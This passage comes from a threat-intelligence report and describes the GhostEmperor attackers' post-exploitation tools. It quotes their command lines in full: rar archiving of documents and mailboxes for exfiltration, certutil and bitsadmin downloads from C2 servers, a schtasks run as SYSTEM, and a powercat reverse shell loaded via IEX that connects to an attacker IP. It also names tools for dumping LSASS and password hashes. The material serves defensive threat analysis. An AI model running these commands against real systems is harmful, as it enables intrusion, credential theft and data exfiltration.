@@ -1,0 +1,69 @@
+Post-exploitation toolset & command details
+In this section we describe in detail all the tools used by the attackers. We also document the command lines used during
+the campaign, where we were able to identify them.
+The leveraged tools were used primarily to steal information from the infected system or spread further in the network.
+Most of them are legitimate or open-source tools, while some are custom made or not so well known. Below are some of
+the main tools we identified:
+• NBTscan : A command line tool to scan a network for NetBIOS information, allowing the attackers to view loggedin users
+or IP addresses of other machines in the network. The NBTscan executable often appeared under the names ‘nbt.exe’ or
+‘nb8.exe’.
+• PsExec : A command line tool that is part of the Sysinternals suite, allowing the attackers to execute processes on
+remote systems.
+• PsList : A command line tool that displays running processes, and is part of the Sysinternals suite.
+• ProcDump : A command line tool that is part of the Sysinternals suite, used to dump process memory. The attackers
+used this tool to dump the memory of the LSASS.exe process and steal passwords.
+• WinRAR : The attackers exfiltrated sensitive files from the infected system, such as JPG images or Word documents and
+used the RAR.exe tool in order to compress them before uploading the data to the C2 server. To make sure the files are
+recent, the attackers provided a command line argument that checked if the files were created after a certain date.
+```
+ rar.exe a -r -v200m -ta20201101000000 -n.doc -n.docx -n.xlsx -n.pdf -n.txt -n.jpg -n*.zip "C:\Windows\debug\
+ log.rar"
+```
+Similarly, this utility was used to archive and exfiltrate mailbox contents retrieved to a .pst file via the PowerShell NewMailboxExportRequest cmdlet. A password protected archive with these contents was generated with the command
+specified below.
+```
+ rar.exe a -r -n*.pst "$windir\debug\log.rar" -hpBaigong -y
+```
+• Certutil, BITSAdmin : Instead of relying on more common methods, the Certutil and BITSAdmin tools are used to
+download additional malicious scripts from the C2 servers to evade detection.
+```
+ certutil.exe -urlcache -split -f hxxp://27.102.113[.]240/debug.txt C:\Windows\pla\debug.bat
+```
+14
+GhostEmperor’s infection chain and post-exploitation toolset: technical details
+An interesting thing we noticed is that in one case the BITSAdmin tool downloaded an archive containing a PowerShell
+installer script from a legitimate website. The website belonged to a government entity from a country in South East Asia,
+which might have been compromised by GhostEmperor prior to this attack, as it hosted one of their malicious files.
+```
+ bitsadmin /transfer myDownLoadJob /download /priority normal "hxxp://[redacted]/1.zip" "C:\Windows\debug\wia\1.zip"
+ expand 1.zip sss.ps1
+```
+• Cscript : The cscript.exe utility executed Visual Basic scripts dropped by the attackers such as ListDomain.vbs, a VB
+script that dates back to 2012 and collects information about the domain or the workgroup of the infected machine.
+ListDomain VB script
+• Schtasks : Instead of running BAT files directly, the attackers scheduled a task (often called ‘test’ or ‘test3’), ran it
+immediately with schtasks.exe and then deleted it.
+```
+ schtasks /create /tn "test3" /tr C:\Windows\debug\wia\h.bat /sc once /st 23:32:00 /ru "system"
+ schtasks /run /tn "test3"
+ schtasks /delete /tn "test3" /f
+```
+• Powercat : Powercat is an open-source tool written in PowerShell, and is meant to be an equivalent of the known
+networking utility NetCat. GhostEmperor’s operators connected to the C2 servers using this tool.
+```
+ powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/
+ powercat/master/powercat.ps1');powercat -c 27.102.113[.]57 -p 443 -e cmd
+```
+15
+GhostEmperor’s infection chain and post-exploitation toolset: technical details
+• Ladon: Ladon is an open-source tool that assists in lateral movement across a network, as it scans for open ports and
+detects devices that are exposed to certain vulnerabilities.
+• Mimikat_ssp : Mimikat_ssp is an open-source custom tool based on the well-known Mimikatz application, with the aim
+of avoiding detection by antivirus solutions.
+• Get-PassHashes.ps1 : Get-PassHashes is a PowerShell script that is part of the open-source Nishang offensive
+security framework, and is intended to dump password hashes.
+• GetPwd : A custom tool to dump passwords from memory that is based on the GetPwd open-source tool from
+Pudn.com.
+• Token.exe : A custom tool that accepts a username and a filename as an argument, and runs the file with system
+privileges.
+16
